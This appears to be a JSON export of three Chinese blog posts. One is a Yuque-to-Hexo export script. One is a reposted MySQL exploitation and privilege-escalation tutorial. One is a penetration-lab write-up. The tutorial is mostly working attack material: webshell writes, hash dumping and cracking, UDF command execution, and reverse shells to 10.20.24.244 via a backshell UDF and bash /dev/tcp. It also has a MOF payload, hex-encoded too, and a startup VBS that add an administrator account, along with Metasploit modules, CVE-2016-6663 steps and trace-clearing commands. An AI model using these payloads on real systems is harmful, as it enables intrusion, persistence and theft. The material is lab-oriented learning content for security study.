[{"title":"将语雀文档内容同步Hexo+Github","path":"/2025/10/10/将语雀文档内容同步Hexo+Github/","content":"背景最初，用 Hexo + GitHub 搭建了自己的博客，图片也托管在 GitHub 图床上。可惜大陆访问不太友好，加载常常慢得令人抓狂。于是改用 OSS，想着图个省心。结果没过多久，短信提醒接二连三地催我充值，倒成了新的烦恼。索性停掉博客，转向安静的 语雀。后来意外发现，语雀的文档不仅可以导出为Markdown，而且“白嫖”的专业会员也能让 知识库公开访问。于是，这篇文章就这样诞生了。 导出文档一开始，我打算用语雀的官方 API 对接 Hexo，这样文章就能自动同步更新。但现实是——API 需要Token，而这个 Token 只有超级会员才能生成。我这“白嫖”的专业会员显然不在待遇范围内。没关系，既然不给接口，那我就自己爬。 访问公开知识库 https://www.yuque.com/076w/syst1m 遍历文章、目录等信息，通过/api/docs/slug?book_id=book_idmode=markdown取到文档的 Markdown 源码导出即可。 图片处理爬下来之后，又遇到新的问题：语雀图片有防盗链。本来想在生成静态页面时，为每张图片加上 referrerpolicy=no-referrer，例如： img src=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png referrerpolicy=no-referrer 不过这样需要改动 Hexo 的渲染逻辑，略显麻烦，于是我暂时放弃了。 后来查资料时发现，可以借助一些放开引用策略的网站来中转图片，如： 搜狗 cdnhttps://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png 测试图片(如果这张图可以被正常加载，就说明可以用) 百度 cdn1https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png 测试图片(如果这张图可以被正常加载，就说明可以用) 关于图床参考这里 语雀等防盗链绕过失败特殊情况及解决 转换文档为了让导出的 Markdown 能直接发布，在导出时就顺便按照 Hexo 的格式做了调整，参考了 Hexo Front-matter 文档： title：文章标题 categories：父目录链路，例如 笔记/靶场日记/HackThebox tags：取最后一级目录名作为一个 tag，例如 HackThebox id：文档 ID date：创建时间 updated：更新时间 本来打算把文章封面图片设为文章中的第一张图，但效果太丑，最终没有采纳。 操作示例假设你的语雀知识库链接是：https://www.yuque.com/076w/syst1m import sysimport requestsimport jsonimport reimport osimport urllib.parsefrom datetime import datetimeIMG_PATTERN = re.compile(r!\\[\\]\\((https://cdn\\.nlark\\.com/yuque/.*?)\\))def save_page(book_id, slug): 下载文档内容并替换图片链接 url = fhttps://www.yuque.com/api/docs/slug?book_id=book_idmerge_dynamic_data=falsemode=markdown r = requests.get(url) if r.status_code != 200: print(文档下载失败:, slug, r.content) return None, None, None data = r.json().get(data, ) content = data.get(sourcecode, ) # 替换图片链接 content = IMG_PATTERN.sub( r![](https://image.baidu.com/search/down?url=\\1), content ) created_at = data.get(created_at) published_at = data.get(published_at) updated_at = data.get(updated_at) or published_at or created_at return content, created_at, updated_atdef build_categories(doc, list_dict): 根据父子关系构建 categories 数组 categories = [] parent = doc.get(parent_uuid) while parent: parent_doc = list_dict.get(parent) if not parent_doc: break categories.insert(0, parent_doc.get(title, )) parent = parent_doc.get(parent_uuid) or None return categoriesdef safe_datetime_str(iso_ts): 格式化 ISO 时间 if not iso_ts: return try: if iso_ts.endswith(Z): iso_ts = iso_ts[:-1] dt = datetime.fromisoformat(iso_ts) return dt.strftime(%Y-%m-%d %H:%M:%S) except Exception: return iso_tsdef get_book(url=https://www.yuque.com/076w/syst1m): r = requests.get(url) m = re.findall(rdecodeURIComponent\\(\\(.+)\\\\)\\);, r.text) if not m: print(未在页面中找到 window.appData 数据，请检查 URL) return docsjson = json.loads(urllib.parse.unquote(m[0])) book_id = str(docsjson[book][id]) book_dir = fdownload/book_id os.makedirs(book_dir, exist_ok=True) list_dict = doc[uuid]: doc for doc in docsjson[book][toc] for doc in docsjson[book][toc]: if doc.get(type) == DOC and doc.get(url): content, created_at, updated_at = save_page(book_id, doc[url]) if content is None: continue categories = build_categories(doc, list_dict) fm_lines = [---, ftitle: doc.get(title, )] # 如果有上级目录，则写 categories 和 tags if categories: fm_lines.append(fcategories: json.dumps(categories, ensure_ascii=False)) fm_lines.append(ftags: json.dumps([categories[-1]], ensure_ascii=False)) fm_lines.append(fid: doc.get(doc_id, )) fm_lines.append(fdate: safe_datetime_str(created_at)) fm_lines.append(fupdated: safe_datetime_str(updated_at)) fm_lines.append(---) fm = .join(fm_lines) + safe_title = re.sub(r[\\\\/*?:|], _, doc.get(title, Untitled)).strip() md_file = os.path.join(book_dir, safe_title + .md) with open(md_file, w, encoding=utf-8) as f: f.write(fm + content) print(f已保存: md_file)if __name__ == __main__: if len(sys.argv) 1: get_book(sys.argv[1]) else: get_book() 1、 保存脚本将上面的 Python 脚本保存为 yuque_export.py。 2、 安装依赖 pip install requests 3、 执行脚本 python yuque_export.py https://www.yuque.com/076w/syst1m 4、 生成 Markdown 文件脚本会在当前目录下生成 download/book_id/ 文件夹，每篇文档对应一个 .md 文件，Front-matter 已按 Hexo 格式生成，图片链接也已替换为可访问的中转链接。 5、 发布到 Hexo将 .md 文件放入 Hexo 的 source/_posts/ 文件夹，即可直接发布。","tags":["杂谈"],"categories":["杂谈"]},{"title":"(转载)MySQL 漏洞利用与提权","path":"/2025/09/20/(转载)MySQL 漏洞利用与提权/","content":"自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。 权限获取数据库操作权限本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法： MySQL 3306 端口弱口令爆破 sqlmap 注入的 --sql-shell 模式 网站的数据库配置文件中拿到明文密码信息 CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 Webshell 权限into oufile 写 shell 知道网站物理路径 高权限数据库用户 load_file () 开启 即 secure_file_priv 无限制 网站路径有写入权限 首先基础语法查询是否 secure_file_priv 没有限制 mysql show global variables like %secure_file_priv%;+--------------------------+| Variable_name | Value |+--------------------------+| secure_file_priv | |+--------------------------+ Value 说明 NULL 不允许导入或导出 tmp 只允许在 tmp 目录导入导出 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell： select ?php phpinfo(); ? into outfile /var/www/html/info.php; sqlmap 中可以如下操作： sqlmap -u http://x.x.x.x/?id=x --file-write=/Users/guang/Desktop/shell.php --file-dest=/var/www/html/test/shell.php 一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。 日志文件写 shell Web 文件夹宽松权限可以写入 Windows 系统下 高权限运行 MySQL 或者 Apache MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell mysql SHOW VARIABLES LIKE general%;+------------------+---------------------------------+| Variable_name | Value |+------------------+---------------------------------+| general_log | OFF || general_log_file | /var/lib/mysql/c1595d3a029a.log |+------------------+---------------------------------+ general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell： set global general_log = ON;set global general_log_file=/var/www/html/info.php;mysql SHOW VARIABLES LIKE general%;+------------------+-----------------------------+| Variable_name | Value |+------------------+-----------------------------+| general_log | ON || general_log_file | /var/www/html/info.php |+------------------+-----------------------------+select ?php phpinfo();?; root@c1595d3a029a:/var/www/html/$ cat info.php /usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with: Tcp port: 3306 Unix socket: /var/run/mysqld/mysqld.sock Time Id Command Argument 201031 21:14:46 40 Query SHOW VARIABLES LIKE general% 201031 21:15:34 40 Query select ?php phpinfo();? 这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ： -rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。 前面分别介绍了数据库权限和 Webshell 权限，那么能不能利用已经获取到的 MySQL 权限来执行系统主机的命令的呢？这个就是下面主要介绍的了 MySQL 提权的知识点了。 Hash 获取与解密假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密： mysql select host, user, password from mysql.user; + | host | user | password | + | localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | | 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | | ::1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | | % | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | + mysql select host,user,authentication_string from mysql.user; + | host | user | authentication_string | + | localhost | root | *8232A1298A49F710DBEE0B330C42EEC825D4190A | | localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | | localhost | mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | + 获取到的 MySQL Hash 值可以通过一些在线网站来解密，如国内的 CMD5 ： 也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的： hashcat -a 0 -m 300 --force 8232A1298A49F710DBEE0B330C42EEC825D4190A password.txt -O -a 破解模式 指定要使用的破解模式，其值参考后面对参数 - [ Attack Modes ] - ===+====== 0 | Straight 1 | Combination 3 | Brute-force 6 | Hybrid Wordlist + Mask 7 | Hybrid Mask + Wordlist -m 破解 hash 类型 指定要破解的 hash 类型，后面跟 hash 类型对应的数字，具体类型详见下表： 12 | PostgreSQL | Database Server131 | MSSQL (2000) | Database Server132 | MSSQL (2005) | Database Server1731 | MSSQL (2012, 2014) | Database Server200 | MySQL323 | Database Server300 | MySQL4.1/MySQL5 | Database Server... –force 忽略破解过程中的警告信息 -O --optimized-kernel-enable 启用优化的内核（限制密码长度） 关于更多 Hashcat 的详细教程可以参考国光我的这一篇文章：Hashcat 学习记录 MySQL 历史上的漏洞yaSSL 缓冲区溢出MySQL yaSSL SSL Hello Message Buffer Overflow 这个缓冲区溢出漏洞 2008 年开始被曝出来，距离现在已经十几年的历史了，所以国光这里没有找到对应的环境测试，不过 MSF 里面已经集成好了对应的模块了： msf6 use exploit/windows/mysql/mysql_yassl_hellomsf6 use exploit/linux/mysql/mysql_yassl_hello 有条件的朋友可以搭建这个漏洞对应的靶场环境 Linux : MySQL 5.0.45-Debian_1ubuntu3.1-log Windows : MySQL 5.0.45-community-nt CVE-2012-2122知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库： for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done MSF 里面也有了对应的脚本模块可以直接使用，成功后会直接 DUMP 出 MySQL 的 Hash 值： msf6 use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf6 set rhosts 127.0.0.1msf6 run 这个 MySQL 的 Hash 解密出的结果为 123456 UDF 提权自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。 手工复现动态链接库如果是 MySQL 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\\plugin 文件夹下文件夹下才能创建自定义函数。 那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。 sqlmap 的 UDF 动态链接库文件位置 sqlmap根目录/data/udf/mysql 不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：/extra/cloak/cloak.py ，解码方法如下： ➜ pwd/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll➜ lsREADME.txt cloak.py lib_mysqludf_sys_32.so lib_mysqludf_sys_64.so__init__.py lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll 国光打包了 sqlmap 解码后的动态链接库：蓝奏云 - sqlmap udf.zip 需要的朋友可以自提 Metasploit 的 UDF 动态链接库文件位置 MSF 根目录/embedded/framework/data/exploits/mysql Metasploit 自带的动态链接库文件无需解码，开箱即可食用。 国光使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。 下面来看下动态链接库里面有包含了哪些函数： 寻找插件目录接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询： mysql show variables like %plugin%;+| Variable_name | Value |+| plugin_dir | /usr/local/mysql/lib/plugin/ |+ 如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \\lib\\plugin 文件夹： mysql select 233 into dumpfile C:\\\\PhpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$index_allocation; 通过 NTFS ADS 流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来： mysql select @@basedir;+| @@basedir |+| /usr/local/mysql |+ 写入动态链接库写入动态链接库可以分为下面几种情形： SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击 sqlmap -u http://localhost:30008/ --data=id=1 --file-write=/Users/sec/Desktop/lib_mysqludf_sys_64.so --file-dest=/usr/lib/mysql/plugin/udf.so 如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的： SELECT 0x7f454c4602... INTO DUMPFILE /usr/lib/mysql/plugin/udf.so;SELECT unhex(7f454c4602...) INTO DUMPFILE /usr/lib/mysql/plugin/udf.so; 这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码： SELECT hex(load_file(/lib_mysqludf_sys_64.so));SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)); 一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察： SELECT hex(load_file(/lib_mysqludf_sys_64.so)) into dumpfile /tmp/udf.txt; SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile /tmp/udf.txt; 为了方便大家直接复制，国光这里单独写了个页面，有意者自取：MySQL UDF 提权十六进制查询 网友们可能看到这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的 ERROR 1126 (HY000): Cant open shared library udf.dll (errno: 193 ) 创建自定义函数并调用命令mysql CREATE FUNCTION sys_eval RETURNS STRING SONAME udf.dll; 导入成功后查看一下 mysql 函数里面是否新增了 sys_eval： mysql select * from mysql.func;+| name | ret | dl | type |+| sys_eval | 0 | udf.dll | function |+ 这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了： mysql select sys_eval(whoami); 如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的 删除自定义函数mysql drop function sys_eval; UDF shell假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。 UDF.PHPt00ls UDF.PHP 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多： Navicat MySQL目标 MySQL 不允许外连，但是可以上传 PHP 脚本: 这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上： 国光这里顺便打包了一份出来：蓝奏云：Navicat tunnel.zip 实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下： 接着连接的时候设置 HTTP 通道： 这个时候主机地址填写 localhost 即可： 连接成功后自然就可以愉快地进行手工 UDF 提权啦： 反弹端口提权实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些： cmdshell downloader open3389 backshell ProcessView KillProcess regread regwrite shut about 这个动态链接库有点历史了，不过还是被国光我找到了蓝奏云：langouster_udf.zip： 下面尝试来使用这个 dll 来反弹 shell 试试看吧，首先在 10.20.24.244 上开启 NC 监听： ➜ ~ ncat -lvp 2333Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333 然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数： mysql CREATE FUNCTION backshell RETURNS STRING SONAME udf.dll; 直接反弹 shell ： mysql select backshell(10.20.24.244, 2333); 成功上线： MOF 提权MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是 C:Windowssystem32wbemmof 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。 手工复现上传 mof 文件执行命令mof 脚本的内容如下： #pragma namespace(\\\\\\\\.\\\\root\\\\subscription) instance of __EventFilter as $EventFilter EventNamespace = Root\\\\Cimv2; Name = filtP2; Query = Select * From __InstanceModificationEvent Where TargetInstance Isa \\Win32_LocalTime\\ And TargetInstance.Second = 5; QueryLanguage = WQL; ; instance of ActiveScriptEventConsumer as $Consumer Name = consPCSV2; ScriptingEngine = JScript; ScriptText = var WSH = new ActiveXObject(\\WScript.Shell\\) WSH.run( et.exe user hacker P@ssw0rd /add\\) WSH.run( et.exe localgroup administrators hacker /add\\); ; instance of __FilterToConsumerBinding Consumer = $Consumer; Filter = $EventFilter; ; 核心 payload 为： var WSH = new ActiveXObject(\\WScript.Shell\\) WSH.run( et.exe user hacker P@ssw0rd /add\\) WSH.run( et.exe localgroup administrators hacker /add\\) MySQL 写文件的特性将这个 MOF 文件导入到 C:Windowssystem32wbemmof 目录下，依然采用上述编码的方式： mysql select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile C:/windows/system32/wbem/mof/test.mof; 执行成功的的时候，test.mof 会出现在：c:windowssystem32wbemgoog 目录下 否则出现在 c:windowssystem32wbembad 目录下： 痕迹清理因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果： net stop winmgmtrmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\del C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /Snet user hacker /deletenet start winmgmt MSF MOF 提权MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错： msf6 use exploit/windows/mysql/mysql_mofmsf6 set payload windows/meterpreter/reverse_tcpmsf6 set rhosts 10.211.55.21msf6 set username rootmsf6 set password rootmsf6 run 实际运行效果如下： 启动项提权这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。 手工复现启动项路径Windows Server 2003 的启动项路径： C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动C:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\StartupC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\StartupC:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\StartupC:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Shutdown Windows Server 2008 的启动项路径： C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartupC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本： Set WshShell=WScript.CreateObject(WScript.Shell)WshShell.Run net user hacker P@ssw0rd /add, 0WshShell.Run net localgroup administrators hacker /add, 0 MySQL 写入启动项将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中： mysql select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\test.vbs; 写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。 MSF 启动项提权没错，MSF 也封装好了对应的模块，目标系统为 Windows 的情况下可以直接使用该模块来上线 MSF，使用起来也很简单： msf6 use exploit/windows/mysql/mysql_start_upmsf6 set rhosts 10.211.55.6msf6 set username rootmsf6 set password rootmsf6 run STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整 MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话： msf6 handler -H 10.20.24.244 -P 4444 -p windows/meterpreter/reverse_tcp 当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了： CVE-2016-6663环境准备国光改了基于网上的教程封装打包了一个 Docker 镜像上传到了 Docker Hub，现在大家部署就会方便许多： docker pull sqlsec/cve-2016-6663docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663 添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限： mysql create database test;mysql CREATE USER test@% IDENTIFIED BY 123456; mysql grant create,drop,insert,select on test.* to test@%;mysql flush privileges; 也可以将上述操作整合成一条命令： mysql -uroot -e create database test;CREATE USER test@% IDENTIFIED BY 123456; grant create,drop,insert,select on test.* to test@%;flush privileges; 漏洞复现竞争条件提权漏洞，一个拥有 CREATEINSERTSELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限 利用成功条件 Getshell 拿到 www-data 权限 拿到 CREATEINSERTSELECT 低权限的 MySQL 账户 关键提取步骤需要在交互环境下，所以需要反弹 shell MySQL 版本需要 5.5.51 或 5.6.x 5.6.32 或 5.7.x 5.7.14 或 8.x 8.0.1 MariaDB 版本需要 5.5.51 或 10.0.x 10.0.27 或 10.1.x 10.1.17 CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit 通过蚁剑上传 EXP，然后 Bash 反弹 shell： 首先 10.20.24.244 端口开启监听： ➜ ~ ncat -lvp 2333Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333 蚁剑终端下反弹 Bash： bash -i /dev/tcp/10.20.24.244/2333 01 在反弹 shell 的情况下，首先编译 EXP： gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient 执行 EXP 提权： ./mysql-privesc-race test 123456 localhost test Bingo! 成功，最后的提权成功的效果如下： 要想获取 root 权限得配合 CVE-2016-6662 与 CVE-2016-6664 这两个漏洞，但是国光 CVE-2016-6664 漏洞复现失败了… 挖个坑，后续有机会再来总结，溜了溜了～～ 文章总结现在文章思路慢慢变成了 MySQL 可操控文件怎么将这个危害扩大影响的问题了。可以往管理员桌面上写一个伪造的 CS 木马，如果对方 Office 有漏洞的话可以写入一个带后门的 word 文件，也可以篡改用户常执行的文件等 这样发散开来就变的很广了，国光这里不再一一叙述了，总之实际场景实际分析，大家在渗透的时候也可以多多思考更多的可能性，万一就成功了呢。 参考资料 《网络攻防实战研究：漏洞利用与提权》 先知 - Windows 下三种 mysql 提权剖析 先知 - mysql 数据库漏洞利用及提权方式小结 先知 - Mysql 提权 (CVE-2016-6663、CVE-2016-6664 组合实践) CSDN: Coisini - Linux MySQL Udf 提权 博客园：sijidou - udf 提权 博客园：litlife - udf 提权原理详解 信安之路：Windows 提权系列中篇 WebShell.cc - Mysql UDF 提权 Leticia’s Blog - mysql 数据库提权总结 阿里云开发者社区 - MySQL 日志配置 支持一下本文可能实际上也没有啥技术含量，但是写起来还是比较浪费时间的，在这个喧嚣浮躁的时代，个人博客越来越没有人看了，写博客感觉一直是用爱发电的状态。如果你恰巧财力雄厚，感觉本文对你有所帮助的话，可以考虑打赏一下本文，用以维持高昂的服务器运营费用（域名费用、服务器费用、CDN 费用等） 没想到文章加入打赏列表没几天 就有热心网友打赏了 于是国光我用 Bootstrap 重写了一个页面用以感谢支持我的朋友，详情请看 打赏列表 | 国光 来自: MySQL 漏洞利用与提权 | 国光","tags":["转载"],"categories":["转载"]},{"title":"无限学习团队月靶场","path":"/2025/09/18/无限学习团队月靶场/","content":"外网信息收集namp：--min-rate 10000 10000速率来扫描-p- 全端口-p80,135 指定80，135端口扫描-sU 指定udp扫描-sT 指定tcp协议-sV 扫描服务版本-sC 默认脚本扫描-O 对操作系统和版本探测--script=vuln 进行基础漏洞扫描nmap -p- --min-rate 10000 192.168.111.22nmap -p- -sU --min-rate 10000 192.168.111.22nmap -p22,3306,6379,18088,18080 --script=vuln 192.168.111.22nmap -p22,3306,6379,18088,18080 -sV -sC -sT -O 192.168.111.22 根据扫描结果开放端口为 SSH（22）、MySQL（3306）、Redis（6379）、Apache Tomcat 404（18088）、http（18080） 外网漏洞探测爆破 SSH（22）、MySQL（3306）、Redis（6379） MySQL弱口令192.168.111.22:3306 rootroot Redis未授权访问192.168.111.22:6379 http://192.168.111.22:18088/ 访问 404 扫扫目录 Web 系统http://192.168.111.22:18088/jeecg-boot/jmreport/list http://192.168.111.22:18080/ 外网漏洞利用MySQL RCE(失败)关于 mysql 知识点可以参考国光的MySQL 漏洞利用与提权 失效访问MySQL 漏洞利用与提权(转载) show global variables like %secure_file_priv%; Value 说明 NULL 不允许导入或导出 tmp 只允许在 tmp 目录导入导出 空 不限制目录 Redis RCE(失败)这里直接用GitHub - DeEpinGh0stMDUT-Extend-Release: MDUT-Extend(扩展版本)比较方便 知识点：Redis未授权利用总结 DocToolkit 系统 RCE(失败)http://192.168.111.22:18080/ 尝试上传，文件读取皆失败，存在弱口令但是页面未开发 弱口令POST /admin/doLogin HTTP/1.1Host: 192.168.111.22:18080Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brCookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1758269454,1758270382Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 30username=adminpassword=123456 登录时发现存在Shiro 框架，爆破密钥失败 Jeecg-Boot 系统RCE(成功)http://192.168.111.22:18088/jeecg-boot/jmreport/list 直接打 nday，因为这里的任意文件上传上传后需要登录，所以选择 SSTI 模板注入 GitHub - MInggongKjeecg-: jeecg综合漏洞利用工具 